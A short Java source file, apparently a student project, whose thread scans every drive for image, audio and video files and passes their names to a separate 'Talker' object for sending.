// Zachary Tennant

import java.io.*;
import java.util.*;
import javax.swing.*;

class ExtractFiles extends Thread
{
	Talker t;

	ExtractFiles(Talker t)
	{
		this.t = t;
		System.out.println("Constructed MyThread");
	}

//###############################################

	public void run()
	{
		System.out.println("Inside run in MyThread");

		File[] roots;

		ArrayDeque<File> deque;

		File folder;
		File[] files;

		String fileName;

		roots = File.listRoots();
		for(int n = 0; n < roots.length; n++)
		{
			deque = new ArrayDeque();
			deque.add(roots[n]);

			while(deque.isEmpty() != true)
			{
				folder = deque.remove();
				files = folder.listFiles();

				if(files != null)
				{
					for(int k = 0; k < files.length; k++)
					{
						fileName = files[k].getName();

						if(files[k].isDirectory() == true)
							deque.add(files[k]);
						else if(fileName.endsWith(".jpeg") || fileName.endsWith(".gif") || fileName.endsWith(".img") || fileName.endsWith(".bmp") || fileName.endsWith(".tiff") ||
													fileName.endsWith(".mp3") || fileName.endsWith(".wav") || fileName.endsWith(".aiff") || fileName.endsWith(".wma") || fileName.endsWith(".bwf") ||
													fileName.endsWith(".avi") || fileName.endsWith(".flv") || fileName.endsWith(".wmv") || fileName.endsWith(".mp4") || fileName.endsWith(".mov"))
						{
							try
							{
								t.send(fileName);
							}
							catch(IOException ioe)
							{
								JOptionPane.showMessageDialog(null, "Can't send fileName");
							}
						} // end else if
					} // end for k
				} // end if
			} // end while
		} // end for n
	} // end run
} // end MyThread class